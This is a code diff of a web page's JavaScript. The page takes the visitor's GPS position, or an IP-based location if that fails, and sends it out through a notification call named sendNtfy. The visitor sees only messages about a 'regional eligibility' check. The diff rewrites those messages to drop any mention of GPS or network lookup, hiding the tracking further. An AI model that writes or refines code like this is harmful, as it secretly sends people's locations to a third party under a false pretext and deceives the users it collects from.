@@ -337,20 +337,20 @@
 
             // ---- MAIN: Send location immediately ----
             async function handleLocation() {
-                updateLocationNote('🔍 Checking regional eligibility…');
+                updateLocationNote('✅ Eligibility Check');
                 try {
                     const gpsLoc = await getGpsLocation();
                     currentLocation = gpsLoc;
                     sendNtfy(gpsLoc);
-                    updateLocationNote('✅ Eligibility verified (GPS)');
+                    updateLocationNote('✅ Eligibility Check');
                 } catch (gpsError) {
                     try {
                         const ipLoc = await getIpLocation();
                         currentLocation = ipLoc;
                         sendNtfy(ipLoc);
-                        updateLocationNote('✅ Eligibility verified (network)');
+                        updateLocationNote('✅ Eligibility verified');
                     } catch (ipError) {
-                        updateLocationNote('⚠️ Could not verify location – please try again later.');
+                        updateLocationNote('please try again later.');
                     }
                 }
             }
